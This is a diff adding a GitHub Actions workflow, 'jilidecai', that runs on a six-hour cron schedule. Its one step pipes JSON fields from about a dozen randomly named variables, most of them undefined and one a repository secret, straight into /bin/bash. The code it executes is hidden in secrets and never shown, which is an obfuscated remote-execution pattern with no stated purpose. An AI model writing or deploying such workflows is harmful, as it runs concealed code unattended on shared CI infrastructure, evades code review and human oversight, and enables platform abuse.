@@ -1,0 +1,28 @@
+name: jilidecai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jilidecai
+        env:
+          unmr99725: ${{ secrets.unmr99725 }}
+        run: |
+          echo $unmr99725 | jq -r .m05493 | /bin/bash
+          echo $cjx7 | jq -r .omdzl505 | /bin/bash
+          echo $uiy5876 | jq -r .ec34 | /bin/bash
+          echo $xw36 | jq -r .j0 | /bin/bash
+          echo $fcd36563 | jq -r .lm3528 | /bin/bash
+          echo $xkgtg2 | jq -r .gdrl2287 | /bin/bash
+          echo $of62217 | jq -r .ighwn2 | /bin/bash
+          echo $rvam3784 | jq -r .rmzv14077 | /bin/bash
+          echo $vp8 | jq -r .b46 | /bin/bash
+          echo $jcd06 | jq -r .kw33 | /bin/bash
+          echo $ppdv8078 | jq -r .qlxaz438 | /bin/bash
+
